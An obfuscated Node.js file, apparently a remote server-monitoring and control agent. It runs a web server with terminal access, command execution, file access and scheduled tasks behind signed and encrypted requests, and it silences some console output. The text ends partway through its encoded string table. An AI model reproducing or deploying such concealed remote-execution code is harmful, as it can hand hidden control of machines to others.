#!/usr/bin/env node
const a0T = a0b;
(function (a, b) {
    const S = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(S(0x43b)) / 0x1 + -parseInt(S(0x286)) / 0x2 + -parseInt(S(0x43e)) / 0x3 + parseInt(S(0x4d1)) / 0x4 + parseInt(S(0x342)) / 0x5 + -parseInt(S(0x2cd)) / 0x6 * (-parseInt(S(0x38b)) / 0x7) + -parseInt(S(0x4f6)) / 0x8 * (-parseInt(S(0x4a3)) / 0x9);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xd522d));
const a0c = [
    a0T(0x458),
    a0T(0x201),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const U = a0T, b = {
            'JMFKl': function (c, d) {
                return c === d;
            },
            'qtfYw': U(0x36d),
            'tUhMN': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const V = U, g = c[V(0x1d7)]();
        if (a0c[V(0x41e)](h => g[V(0x376)](h))) {
            if (b['JMFKl'](typeof f, b[V(0x36f)]))
                b[V(0x2e3)](f);
            return !![];
        }
        return a[V(0x1e8)](this, arguments);
    };
}
process[a0T(0x32e)][a0T(0x455)] = a0d(process[a0T(0x32e)][a0T(0x455)]), process['stderr']['write'] = a0d(process[a0T(0x27f)][a0T(0x455)]);
const a0f = require(a0T(0x495)), a0g = require(a0T(0x497)), a0h = require('fs'), a0i = require('fs')[a0T(0x2b0)], a0j = require(a0T(0x4e2)), a0k = require('os'), {exec: a0l} = require(a0T(0x2ba)), a0m = require('node-cron'), a0n = require(a0T(0x4f3)), {encrypt: a0o} = require(a0T(0x35b)), a0p = require('base64-js'), a0q = require('express-ws'), a0r = require(a0T(0x377));
let a0s, a0t;
try {
    typeof Bun !== 'undefined' ? a0t = require(a0T(0x3f0)) : a0t = require(a0T(0x2d2));
} catch (a0R) {
    console[a0T(0x356)]('\x1b[31m[FATAL\x20ERROR]\x1b[0m\x20核心终端依赖\x20(pty)\x20加载失败，程序终止！'), console['error'](a0T(0x402) + a0R[a0T(0x476)]), console['error'](a0T(0x488)), process[a0T(0x317)](0x1);
}
const a0u = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const W = a0T, a = {
                'HzJLa': function (b, c) {
                    return b !== c;
                },
                'TpRWI': W(0x3ea)
            };
        return a[W(0x442)](typeof a0E, a['TpRWI']) && a[W(0x442)](a0E['LOG_LEVEL'], undefined) ? a0E['LOG_LEVEL'] : 0x2;
    },
    'debug': a => {
        const X = a0T, b = {
                'Hvjgm': function (c, d) {
                    return c <= d;
                }
            };
        b[X(0x2d8)](a0u['currentLevel'], a0u['LEVELS'][X(0x482)]) && console[X(0x2e2)](X(0x37c) + a);
    },
    'info': a => {
        const Y = a0T, b = {
                'oEBMK': function (c, d) {
                    return c <= d;
                }
            };
        b[Y(0x1e2)](a0u['currentLevel'], a0u[Y(0x1f0)][Y(0x40c)]) && console[Y(0x2e2)](Y(0x457) + a);
    },
    'warn': a => {
        const Z = a0T;
        a0u[Z(0x3fc)] <= a0u[Z(0x1f0)][Z(0x209)] && console[Z(0x2e2)]('\x1b[33m[WARN]\x1b[0m\x20' + a);
    },
    'error': a => {
        const a0 = a0T, b = {
                'dUigN': function (c, d) {
                    return c <= d;
                }
            };
        b[a0(0x250)](a0u['currentLevel'], a0u[a0(0x1f0)][a0(0x3af)]) && console[a0(0x2e2)](a0(0x4c7) + a);
    }
};
class a0v {
    constructor(a = 'ok') {
        const a1 = a0T;
        this[a1(0x470)] = a;
    }
}
class a0w extends a0v {
    constructor(a = 'ok', b = 0x0) {
        const a2 = a0T;
        super(a), this[a2(0x3b5)] = b;
    }
}
class a0x extends a0v {
    constructor() {
        const a3 = a0T, a = { 'xbuxU': a3(0x3e2) }, b = a[a3(0x46b)][a3(0x42e)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a3(0x49a)] = '';
                continue;
            case '1':
                this[a3(0x463)] = '';
                continue;
            case '2':
                this[a3(0x38a)] = null;
                continue;
            case '3':
                super();
                continue;
            case '4':
                this['os'] = '';
                continue;
            case '5':
                this[a3(0x474)] = 0x0;
                continue;
            case '6':
                this[a3(0x428)] = null;
                continue;
            case '7':
                this[a3(0x3ce)] = a0E['AGENT_VERSION'];
                continue;
            case '8':
                this[a3(0x331)] = '';
                continue;
            case '9':
                this[a3(0x251)] = '';
                continue;
            case '10':
                this['kernel_version'] = '';
                continue;
            case '11':
                this['disk_total'] = 0x0;
                continue;
            case '12':
                this[a3(0x39e)] = null;
                continue;
            case '13':
                this[a3(0x32a)] = 0x0;
                continue;
            case '14':
                this[a3(0x260)] = '';
                continue;
            case '15':
                this[a3(0x41a)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0y extends a0v {
    constructor() {
        const a4 = a0T, a = { 'cXbdB': a4(0x225) }, b = a[a4(0x3b2)][a4(0x42e)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a4(0x472)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '1':
                this[a4(0x494)] = 0x0;
                continue;
            case '2':
                this[a4(0x2b9)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '3':
                this['network'] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '4':
                super();
                continue;
            case '5':
                this[a4(0x24f)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '6':
                this[a4(0x4c1)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '7':
                this[a4(0x28d)] = 0x0;
                continue;
            case '8':
                this[a4(0x1e6)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '9':
                this['message'] = '';
                continue;
            case '10':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            }
            break;
        }
    }
}
class a0z extends a0v {
    constructor() {
        const a5 = a0T;
        super(), this['result'] = '', this[a5(0x38f)] = 0x0, this['timeout'] = ![], this[a5(0x22e)] = '';
    }
}
class a0A {
    constructor() {
        const a6 = a0T, a = { 'GUCXw': a6(0x2ff) }, b = a[a6(0x389)][a6(0x42e)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a6(0x336)] = '';
                continue;
            case '1':
                this[a6(0x4ed)] = '';
                continue;
            case '2':
                this[a6(0x315)] = '';
                continue;
            case '3':
                this[a6(0x2d6)] = '';
                continue;
            case '4':
                this[a6(0x385)] = '';
                continue;
            case '5':
                this[a6(0x3ab)] = 0x0;
                continue;
            case '6':
                this[a6(0x4e2)] = '';
                continue;
            case '7':
                this[a6(0x409)] = '';
                continue;
            }
            break;
        }
    }
}
class a0B {
    constructor() {
        const a7 = a0T, a = { 'pDHsK': a7(0x481) }, b = a[a7(0x4e7)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a7(0x4e2)] = '';
                continue;
            case '1':
                this[a7(0x2be)] = ![];
                continue;
            case '2':
                this[a7(0x385)] = '';
                continue;
            case '3':
                this[a7(0x2d6)] = '';
                continue;
            case '4':
                this[a7(0x372)] = ![];
                continue;
            case '5':
                this['mode'] = '';
                continue;
            case '6':
                this[a7(0x2d7)] = ![];
                continue;
            case '7':
                this[a7(0x4ed)] = '';
                continue;
            }
            break;
        }
    }
}
class a0C extends a0v {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0D {
    static [a0T(0x23b)]() {
        const a8 = a0T, a = {
                'dHVbR': a8(0x3e4),
                'cGVhF': 'jwk',
                'yfAgC': a8(0x271),
                'htSEI': function (i, j) {
                    return i !== j;
                },
                'tgYKW': a8(0x4ce)
            }, {
                privateKey: b,
                publicKey: c
            } = a0g['generateKeyPairSync'](a['dHVbR']), d = b[a8(0x371)]({ 'format': a[a8(0x229)] }), f = c[a8(0x371)]({ 'format': a[a8(0x229)] }), g = Buffer[a8(0x2d9)](d['d'], a[a8(0x363)]), h = Buffer[a8(0x2d9)](f['x'], a['yfAgC']);
        return (g[a8(0x4e9)] !== 0x20 || a[a8(0x332)](h['length'], 0x20)) && a0u[a8(0x356)](a8(0x2b7)), {
            'private_b64': g[a8(0x1d7)](a[a8(0x282)]),
            'public_b64': h[a8(0x1d7)](a[a8(0x282)])
        };
    }
    static [a0T(0x386)](a) {
        const a9 = a0T, b = this[a9(0x23b)]();
        return {
            'role': a,
            'private_b64': b[a9(0x34b)],
            'public_b64': b[a9(0x462)]
        };
    }
    static [a0T(0x29b)](a = a0T(0x4bd), b = a0T(0x46d)) {
        const aa = a0T, c = {
                'control': this[aa(0x386)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0E {
    static [a0T(0x384)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static ['EXEC_SHELL_MODE'] = (process.env.EXEC_SHELL || a0T(0x39b))[a0T(0x338)]() === a0T(0x39b);
    static ['DEBUG'] = (process.env.DEBUG || a0T(0x322))[a0T(0x338)]() === a0T(0x39b);
    static [a0T(0x3b6)] = parseInt(process.env.TIMESTAMP_WINDOW || a0T(0x2f9));
    static [a0T(0x3f2)] = parseInt(process.env.LOG_LEVEL || (this['DEBUG'] ? '0' : '2'), 0xa);
    static [a0T(0x4d9)] = a0E['_getConfigValue'](a0T(0x227), a0T(0x349)) || 'ECDSA公钥内容';
    static [a0T(0x3ad)] = a0E[a0T(0x29d)](a0T(0x1fe), a0T(0x44a)) || 'ECIES公钥内容';
    static [a0T(0x219)] = process.env.FILE_ROOT || a0k[a0T(0x299)]();
    static [a0T(0x45f)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0T(0x47b));
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0T(0x322))[a0T(0x338)]() === a0T(0x39b);
    static [a0T(0x3f7)] = (process.env.FILE_AUDIT_LOG || 'true')[a0T(0x338)]() === a0T(0x39b);
    static ['InitTask'] = !![];
    static ['onetasks'] = [];
    static [a0T(0x3cb)] = {};
    static [a0T(0x1ee)] = ![];
    static [a0T(0x4ab)] = parseInt(process.env.TASK_TIMEOUT || a0T(0x4e1));
    static [a0T(0x30b)] = parseInt(process.env.CRON_INTERVAL || '30');
    static ['onetimetasks_log'] = [];
    static [a0T(0x2ad)] = [];
    static [a0T(0x405)] = parseInt(process.env.MAX_TASK_LOG || a0T(0x34d));
    static ['HOST'] = process.env.HOST || a0T(0x310);
    static [a0T(0x421)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0T(0x4cd));
    static [a0T(0x30a)] = process.env.AGENT_VERSION || a0T(0x305);
    static [a0T(0x4be)] = a0g['randomBytes'](0x20)['toString'](a0T(0x4ce));
    static ['NOISE_KEYS_INTERNAL'] = a0D['generatePair']();
    static [a0T(0x2df)] = {
        'controller': { 'private': this[a0T(0x3bc)]['control'][a0T(0x34b)] },
        'agent': { 'public': this[a0T(0x3bc)]['agent'][a0T(0x462)] }
    };
    static [a0T(0x447)] = 0xe10;
    static [a0T(0x4d5)] = 0x1e;
    static [a0T(0x4f5)] = null;
    static [a0T(0x2e1)] = 0x0;
    static [a0T(0x328)] = null;
    static [a0T(0x3d9)] = null;
    static [a0T(0x393)] = 0x0;
    static [a0T(0x4ec)] = null;
    static [a0T(0x29d)](a, b) {
        const ab = a0T, c = process.env[a];
        if (c)
            return c;
        const d = a0j[ab(0x25e)](__dirname, b);
        if (a0h['existsSync'](d))
            try {
                return a0h[ab(0x3cc)](d, ab(0x2ca))[ab(0x203)]();
            } catch (f) {
            }
        return '';
    }
    static [a0T(0x297)]() {
        const ac = a0T, a = {
                'aBAyT': ac(0x3bd),
                'ogpBB': ac(0x325),
                'SshBl': ac(0x49e),
                'nGkFx': '❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):',
                'raLPj': ac(0x32f)
            };
        if (!this[ac(0x482)]) {
            const b = [];
            !this[ac(0x4d9)] && b[ac(0x4d2)](a['aBAyT']);
            !this[ac(0x3ad)] && b[ac(0x4d2)](ac(0x4e0));
            if (b[ac(0x4e9)] > 0x0) {
                const c = ac(0x1eb)['split']('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0u[ac(0x1ff)](a['ogpBB']);
                        continue;
                    case '1':
                        process[ac(0x317)](0x1);
                        continue;
                    case '2':
                        b[ac(0x347)](f => a0u[ac(0x356)](ac(0x28a) + f));
                        continue;
                    case '3':
                        a0u[ac(0x1ff)](a[ac(0x38d)]);
                        continue;
                    case '4':
                        a0u[ac(0x356)](a['nGkFx']);
                        continue;
                    case '5':
                        a0u[ac(0x1ff)](a[ac(0x31c)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0T(0x33c)](a = {}) {
        const ad = a0T, b = {
                'hLUhp': function (c, d) {
                    return c !== d;
                },
                'KWpAB': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (!a)
            return;
        a[ad(0x421)] !== undefined && b[ad(0x3be)](a['PORT'], null) && (this['PORT'] = b[ad(0x1e5)](parseInt, String(a[ad(0x421)]), 0xa)), a[ad(0x4d9)] && (this[ad(0x4d9)] = a[ad(0x4d9)][ad(0x203)]()), a[ad(0x3ad)] && (this[ad(0x3ad)] = a[ad(0x3ad)][ad(0x203)]());
    }
}
class a0F {
    constructor(a, b) {
        const ae = a0T, c = {
                'XPyBB': ae(0x1d8),
                'IOLLr': ae(0x4ce),
                'ROFvs': function (d, f) {
                    return d(f);
                },
                'KIjSZ': ae(0x221)
            };
        this[ae(0x401)] = null, this[ae(0x1fa)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[ae(0x207)](c[ae(0x240)]))
                    this[ae(0x401)] = a0g[ae(0x25c)](d);
                else {
                    const f = Buffer['from'](d, c[ae(0x350)]), g = a0s[ae(0x3c5)][ae(0x292)](f), h = g[ae(0x2f6)](![]), i = m => m[ae(0x1d7)](ae(0x4ce))[ae(0x47c)](/\+/g, '-')[ae(0x47c)](/\//g, '_')[ae(0x47c)](/=/g, ''), j = i(Buffer[ae(0x2d9)](h[ae(0x2f0)](0x1, 0x21))), k = c[ae(0x4a8)](i, Buffer[ae(0x2d9)](h[ae(0x2f0)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[ae(0x2fe)],
                            'x': j,
                            'y': k
                        };
                    this[ae(0x401)] = a0g[ae(0x25c)]({
                        'key': l,
                        'format': 'jwk'
                    });
                }
            } catch (m) {
                a0u['error'](ae(0x26d) + m['message']), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this['eciesPubkey'] = a0p['toByteArray'](b[ae(0x203)]());
            } catch (n) {
                a0u[ae(0x324)](ae(0x2b6) + n[ae(0x476)]);
            }
    }
    [a0T(0x246)](a, b, c) {
        const af = a0T, d = {
                'Tvxyd': function (f, g) {
                    return f > g;
                },
                'hbzeG': function (f, g) {
                    return f - g;
                },
                'UEopD': af(0x2ec)
            };
        if (!this[af(0x401)])
            return !![];
        try {
            const f = parseInt(b), g = Math[af(0x4a9)](Date[af(0x48c)]() / 0x3e8);
            if (d['Tvxyd'](Math[af(0x30f)](g - f), a0E[af(0x3b6)]))
                throw new Error(af(0x346) + Math[af(0x30f)](d[af(0x34a)](g, f)) + 's\x20>\x20' + a0E['TIMESTAMP_WINDOW'] + 's');
            const h = '' + a + b, i = a0p[af(0x274)](c), j = a0g[af(0x365)](d[af(0x3fa)]);
            return j[af(0x295)](h), j[af(0x2f4)](this[af(0x401)], i);
        } catch (k) {
            throw new Error(af(0x450) + k[af(0x476)]);
        }
    }
    [a0T(0x404)](a) {
        const ag = a0T, b = {
                'aBuBl': 'utf-8',
                'lUztz': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (a0E['DEBUG'] || !this[ag(0x1fa)])
            return JSON[ag(0x47f)](a);
        try {
            const c = JSON['stringify'](a), d = Buffer[ag(0x2d9)](c, b['aBuBl']), f = Buffer[ag(0x2d9)](this['eciesPubkey']), g = b[ag(0x43d)](a0o, f, d);
            return Buffer[ag(0x2d9)](g)[ag(0x1d7)]('base64');
        } catch (h) {
            const i = {
                '_encrypt_error': h[ag(0x476)],
                '_raw': a0E[ag(0x482)] ? a : null
            };
            return JSON[ag(0x47f)](i);
        }
    }
    [a0T(0x4b7)](a, b) {
        const ah = a0T, c = {
                'zeLCq': function (d, f) {
                    return d !== f;
                },
                'fzPDn': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'HYubG': ah(0x4ce),
                'omiol': ah(0x2ca),
                'Sepcn': ah(0x26c),
                'OLmeW': 'aes-256-gcm'
            };
        if (!b || c[ah(0x441)](b[ah(0x4e9)], 0x20))
            throw new Error(c[ah(0x1dd)]);
        try {
            const d = Buffer[ah(0x2d9)](a, c[ah(0x379)])[ah(0x1d7)](c['omiol']), f = JSON[ah(0x493)](d);
            if (!f[ah(0x429)] || !f[ah(0x291)] || !f[ah(0x2a6)])
                throw new Error(c[ah(0x2b5)]);
            const g = Buffer[ah(0x2d9)](f[ah(0x429)], c[ah(0x379)]), h = Buffer[ah(0x2d9)](f[ah(0x291)], c[ah(0x379)]), i = Buffer[ah(0x2d9)](f[ah(0x2a6)], c[ah(0x379)]), j = a0g[ah(0x302)](c[ah(0x279)], b, g);
            j[ah(0x4e8)](h);
            let k = j[ah(0x295)](i, null, c[ah(0x2bb)]);
            return k += j['final'](c[ah(0x2bb)]), k;
        } catch (l) {
            throw new Error(ah(0x4a4) + l[ah(0x476)]);
        }
    }
}
function a0G(a) {
    const ai = a0T, b = {
            'quYYu': ai(0x38e),
            'vlvGt': 'application/json',
            'IgGTV': function (c, d) {
                return c === d;
            },
            'RqSBs': ai(0x48f),
            'fIPOX': ai(0x39b),
            'pJWMd': ai(0x396),
            'lQLMW': ai(0x20f),
            'zqmVH': ai(0x2ca),
            'spUhN': ai(0x20e),
            'SBuvh': 'false',
            'tVcZN': ai(0x1fb),
            'Rhegv': ai(0x42c),
            'OurrO': function (c) {
                return c();
            },
            'DHEda': function (c, d) {
                return c === d;
            },
            'JOqvZ': ai(0x298),
            'MGgyz': ai(0x399),
            'KkGOW': ai(0x318),
            'vXikd': ai(0x1e0),
            'SqIQx': ai(0x3db),
            'RmRnV': ai(0x352),
            'TALCx': ai(0x30d),
            'kmXJp': 'X-Auth-Token',
            'vHSLL': function (c, d) {
                return c || d;
            },
            'XheSS': ai(0x2f2),
            'OmSWp': function (c, d) {
                return c === d;
            },
            'cluBB': ai(0x3eb),
            'UVdkY': ai(0x4ce),
            'QQwfN': ai(0x410),
            'JJeBi': ai(0x3dc)
        };
    return async (c, d, f) => {
        const aj = ai;
        if (c['path'][aj(0x207)](b[aj(0x4e4)]) || b[aj(0x2aa)]((c[aj(0x1de)][aj(0x3cf)] || '')[aj(0x338)](), b[aj(0x247)]))
            return b['OurrO'](f);
        if (b['DHEda'](c[aj(0x489)], b[aj(0x2d1)]) || b[aj(0x2aa)](c['method'], aj(0x263)))
            return b['OurrO'](f);
        c['is_authenticated'] = !![];
        const g = [
            b[aj(0x233)],
            b[aj(0x48b)]
        ];
        if (!a0E[aj(0x482)] && !c[aj(0x1de)][b[aj(0x3c2)]]) {
            const i = c['headers'][aj(0x2f8)] || c['headers'][b['SqIQx']], j = c[aj(0x1de)][b['RmRnV']] || c[aj(0x1de)][b[aj(0x47d)]], k = c[aj(0x1de)][aj(0x403)] || c[aj(0x1de)][b[aj(0x37a)]];
            if (b[aj(0x39d)](!i, !j) || !k) {
                if (g[aj(0x376)](c['path']))
                    c[aj(0x4d4)] = ![];
                else
                    return d['status'](0x191)[aj(0x4c0)]({ 'error': b['XheSS'] });
            }
            if (c[aj(0x4d4)])
                try {
                    a[aj(0x246)](i, j, k);
                } catch (l) {
                    if (g[aj(0x376)](c[aj(0x4e2)]))
                        c[aj(0x4d4)] = ![];
                    else
                        return d['status'](0x191)['json']({ 'error': aj(0x450) + l[aj(0x476)] });
                }
        }
        if (c['body'] && b[aj(0x2aa)](typeof c[aj(0x4f1)], aj(0x48f))) {
            const m = b[aj(0x265)]((c['headers'][b[aj(0x293)]] || '')['toLowerCase'](), b[aj(0x37f)]);
            try {
                if (m && c['is_authenticated']) {
                    const n = Buffer['from'](a0E['SESSION_KEY'], b['UVdkY']), o = a[aj(0x4b7)](c['body'], n);
                    c['body'] = JSON[aj(0x493)](o);
                } else {
                    if (c[aj(0x4f1)]['startsWith'](b[aj(0x3a5)])) {
                        const p = Buffer[aj(0x2d9)](c[aj(0x4f1)], b[aj(0x42d)])[aj(0x1d7)](b[aj(0x319)]);
                        c[aj(0x4f1)] = JSON[aj(0x493)](p);
                    } else {
                        if (c[aj(0x4f1)][aj(0x203)]()[aj(0x207)]('{') || c[aj(0x4f1)][aj(0x203)]()[aj(0x207)]('['))
                            c['body'] = JSON[aj(0x493)](c[aj(0x4f1)]);
                        else {
                            if (b[aj(0x487)](c[aj(0x4f1)][aj(0x203)](), ''))
                                c['body'] = {};
                        }
                    }
                }
            } catch (q) {
                return a0u[aj(0x356)]('💥\x20[Body\x20Parse\x20Error]:\x20' + q[aj(0x476)]), d[aj(0x470)](0x190)[aj(0x4c0)]({ 'error': aj(0x2ed) + q[aj(0x476)] });
            }
        }
        const h = d[aj(0x39c)];
        d[aj(0x39c)] = function (r) {
            const ak = aj;
            if (d[ak(0x224)](b[ak(0x1f7)]) && d[ak(0x224)](b[ak(0x1f7)])[ak(0x376)](b[ak(0x1ec)]))
                try {
                    const s = b[ak(0x2aa)](typeof r, b[ak(0x4b5)]) ? JSON['parse'](r) : r;
                    if (c[ak(0x4d4)]) {
                        const t = a['encryptResponse'](s), u = b[ak(0x2aa)](typeof t, b[ak(0x4b5)]) ? t : JSON[ak(0x47f)](t);
                        return !a0E[ak(0x482)] && (d[ak(0x4d0)](ak(0x20e), b['fIPOX']), d[ak(0x4d0)](b[ak(0x4a0)], a0E['AGENT_VERSION'])), d[ak(0x4d0)](b[ak(0x408)], Buffer[ak(0x31d)](u, b[ak(0x241)])[ak(0x1d7)]()), h[ak(0x479)](this, u);
                    } else {
                        const v = typeof r === b[ak(0x4b5)] ? r : JSON[ak(0x47f)](s);
                        return d['set'](b[ak(0x296)], b['SBuvh']), d[ak(0x4d0)]('Content-Length', Buffer[ak(0x31d)](v, ak(0x2ca))['toString']()), h[ak(0x479)](this, v);
                    }
                } catch (w) {
                    if (a0E['DEBUG'])
                        a0u[ak(0x356)](ak(0x294) + w[ak(0x476)]);
                }
            return h[ak(0x479)](this, r);
        }, b['OurrO'](f);
    };
}
function a0a() {
    const c8 = [
        'BM9Uy2u',
        'wgXfDhy',
        'Bwf4',
        'D2vIC29JA2v0',
        'vvzKA1K',
        'C3bSAxq',
        'u2D5BMm',
        'CgLK',
        'Dg9Rzw4',
        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'zev3AKe',
        'y3b1',
        'zgLYBMfTzq',
        'wgTrBhG',
        'q0vNzwS',
        'zg9JA2vY',
        'BhLvDxC',
        'sLzNCfC',
        'mJG0mda2rujTs1fq',
        'mhWXFdr8m3WYFdv8nG',
        'Bfv6DhO',
        'mJqYmZG3n2LJDuXqBG',
        '8j+AGcdNU4JNQ6/OV5VNQiVLT7lLKk/LIQGGkfbjrdOG',
        'lY5KB2nRzxjLBNy',
        'EMvmq3e',
        'shPktge',
        'DuP1reG',
        'C2v0q3jVBLrHC2TZ',
        'Dw5SAw5Ru3LUyW',
        'C2HPzNq',
        'qKftruLorK9Fq0fdsevFvfrm',
        'zML3AgK',
        'zxHLy3v0zu9UzxrPBwvuyxnRCW',
        'A2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0',
        'CMvHzezPBgu',
        'B25LDgLTzq',
        'BKTmr04',
        'rw5JCNLWDfDPDgHbza',
        'y2XLyxjpBMv0Aw1Ltg9NCW',
        'u2LNBMf0DxjLihzLCMLMAwnHDgLVBIbMywLSzwq6ia',
        'vxvxEg8',
        '6i635y+wieLqiowCSowDGowKSEI0PtOG',
        'vuHhqLm',
        'vhf3Ahi',
        'D3jPDgu',
        'DwrW',
        'g1SZnM1Bsu5gt10BwZbTia',
        'D2fZBsbZDhjLyw1PBMCGy29TCgLSzsbMywLSzwq',
        'qKvxwMu',
        'zKPOCMC',
        'BxnNuMvZB2X2zxjZ',
        'tK9ju0vFuK9mrv9srvnqt05ervi',
        'sw5PDgLHBgL6zq',
        'wf9psW',
        'tufyx1vqte9brf9tsvPf',
        'tK9hqxy',
        'vhHgEvu',
        'ChvIBgLJx2i2na',
        'y3b1x25HBwu',
        'rMfPBgvKihrVigXVywqGBM9PC2uTyY53yxnTig1VzhvSzq',
        'zMLSDgvY',
        'uwjmuM4',
        'zKTuzwK',
        'CM91BMq',
        'AxnjBML0Awf0B3i',
        'Chv0',
        'Egj1Efu',
        'rM54ugi',
        'qwDLBNq',
        'C3rHCNrtzxnZAw9U',
        'r0HKAgW',
        'C3rHDhvZ',
        'ywDLBNq',
        'zgLZAW',
        'CMvXDwvZDf9Pza',
        'y3b1x2nVCMvZ',
        'wuPeuxO',
        'BwvZC2fNzq',
        'Dw5JyxvNAhrfEgnLChrPB24',
        'xsdMIAFOOyZNU4JNQ6/OTytMUPdMUixNKiyUlI4',
        'y2fSBa',
        '8j+qMIdKVB/NLkGGu2HLBgWG6lEV5B6eoIa',
        'mta0odu3nJaW',
        'CMvWBgfJzq',
        'vefmq3G',
        'CgfYyw1Z',
        'C3rYAw5NAwz5',
        'Cg9ZDa',
        'mhWYFdv8m3W3Fdr8mxW2',
        'revcvuC',
        'rejTBve',
        'u2vYDMvYigXPC3rLBMLUzYbZDwnJzxnZzNvSBhK',
        'zwTWsLK',
        'zLLZDMC',
        'reHfzge',
        '8j+sOsdKV67LPi3LU7RORQ46ioIVT+wCQoMHUEEBRUEBRUw9LEs4I+I/KoIHJcbUCg0GAw5ZDgfSBcbaBhLKzwXSl25VzguTChr5',
        'Bwv0Ag9K',
        'x2DLDerPC2TjBMzV',
        's2Tht1C',
        'BM93',
        'qwzLDNO',
        'tK9ju0vFuK9mrv9jtKLusufut1i',
        'C3rYAw5N',
        'Cgf0Ahm',
        'run5vfi',
        'tM9PC2uGv0fttsbTB2r1BguGBM90igf2ywLSywjSzq',
        'CgfYC2u',
        'Dxb0Aw1L',
        'zxHWCMvZCW',
        'DxbSB2fKrMLSzq',
        'y3j5ChrV',
        'BwfW',
        'v3jPDgvnzxnZywDL',
        'DMLYDhvHBgL6yxrPB24',
        'l2fWAs90yxnRl2XVzY9VBMv0Aw1L',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'BhHJ',
        'icaGmI4G5OIw5Bcg5A+g6zkL5PAh5lU25Ps+5ywLic4VA2v5CY8G55UU5B2vicJOV5dOOyWGz2vUzxjHDgvFA2v5CY5WEsdNLj/MIjaP',
        'svb2na',
        'CePxtwq',
        'EMPWsue',
        'Aw5MBW',
        'mtCZn0fuquDVEG',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'zgLZDhjV',
        'lcbtAwDUywW6ia',
        'zMLSzw5HBwu',
        'uK9gDNm',
        'zMXVB3i',
        'l2jPBI9ZAa',
        'vefts19usu1ft1vu',
        'y29WEuzPBgvZ',
        'DurWsuu',
        'Cgf0Adi',
        '8j+uKcdMO4dMTyVLIlaGvg9Rzw7VViZOP4BKUlOGv1ntioMtVUI3R++8JoI3S+I/HYboB2LZzq',
        'y2H1BMTFAwqGyw5KihrVDgfSx2nODw5RCYbTDxn0igjLig51BwvYAwm',
        'rMLSzsbUB3qGzM91BMq',
        'sLHhtwe',
        'x2zVCM1HDe1Vzgu',
        'x2DLDfzPCNr1ywXPEMf0Aw9U',
        'uNftqNm',
        'rvzlEgG',
        'zgvJCNLWDerHDge',
        'yxnZAwDU',
        'y3DtDuq',
        'Dw5RBM93BG',
        'B3zLCMXHEq',
        'y3DTAue',
        'q29UDhjVBgXLCG',
        'u0vtu0LptL9lrvK',
        'EMPAvuS',
        'ANnVBG',
        'CMfT',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'vMfSAwrHDgLUzYbJB25MAwCUlI4',
        'Euvquw0',
        'y3vYCMvUDeXVywq',
        'quHAA3e',
        'g1SZmw1Brvjst1jDg1SWBsa',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'tfvAsxy',
        'uLnLtey',
        'vMn0CxG',
        'CLjorfy',
        'odaWma',
        'yMfZzty0',
        'w+E7IoERR+s8MUIVNsa',
        'C2v0',
        'ndG2mZq4meHnu0j1zq',
        'ChvZAa',
        'vNDTBfu',
        'AxnFyxv0AgvUDgLJyxrLza',
        'u1rbvfvtx0nbq0Hfx1ruta',
        'zMu4mdO',
        'DgvZDa',
        'DhnNwKq',
        'runeu0fFufvcteLdx0Tfwv9qru0',
        'tM9Uzq',
        'BxnNuxvLDwu',
        'z2v0t25LDgLTzvrHC2TZ',
        'rMLSzsb0B28GBgfYz2u',
        'vMzYq3q',
        'yKD4r04',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'mZaW',
        'Cgf0Aa',
        'yw5rEvq',
        'DfzJwK4',
        'BMv0D29YA1n0yxrZ',
        'uur1tuK',
        'CeriC0S',
        'C2v0qxv0AfrHzW',
        'BgvUz3rO',
        'D3jPDgvgAwXLu3LUyW',
        'uMHHsxC',
